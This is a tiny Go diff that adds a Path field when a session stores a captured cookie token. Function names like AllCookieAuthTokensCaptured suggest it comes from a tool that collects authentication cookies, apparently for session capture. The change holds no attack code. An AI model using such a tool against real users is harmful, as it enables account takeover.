@@ -103,10 +103,10 @@ func (s *Session) AddCookieAuthToken(domain string, key string, value string, pa
 		s.CookieTokens[domain][key] = &database.CookieToken{
 			Name:     key,
 			Value:    value,
+			Path:     path,
 			HttpOnly: http_only,
 		}
 	}
-
 }
 
 func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
